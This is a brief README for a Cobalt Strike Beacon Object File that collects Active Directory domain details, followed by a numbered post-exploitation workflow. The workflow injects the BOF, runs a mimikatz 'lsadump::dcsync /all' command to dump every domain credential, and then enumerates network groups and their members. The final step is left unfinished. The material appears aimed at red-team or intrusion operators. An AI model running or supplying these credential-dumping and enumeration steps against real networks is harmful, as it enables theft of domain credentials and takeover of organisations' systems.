# CobaltStrike BOF :
This is a BOF to return Domain Forest Name, Domain Name, Domain Controller, address, sitename 


BOF files included:

get_domain_info.c: This will return Domain Forest Name, Domain Name, Domain Controller+address+sitename 


Instructions for completing flowchart 

Step 1) We need the domain of windows computer.
    Inject get_domain_info.o without arguments

Step 2) Attempt to retrieve domain controller credentials using mimikatz
    mimikatz lsadump::dcsync /domain:<DOMAIN NAME> /all /csv

Step 3) Get a list of all network groups
    Inject get_net_groups.o with the following arguments ("<DOMAIN>")

Step 4) List members of each network groups
    Inject get_net_group_members.o with the following arguments ("<DOMAIN>", "<GROUP>")

Step 5) List everyone logged into the domain
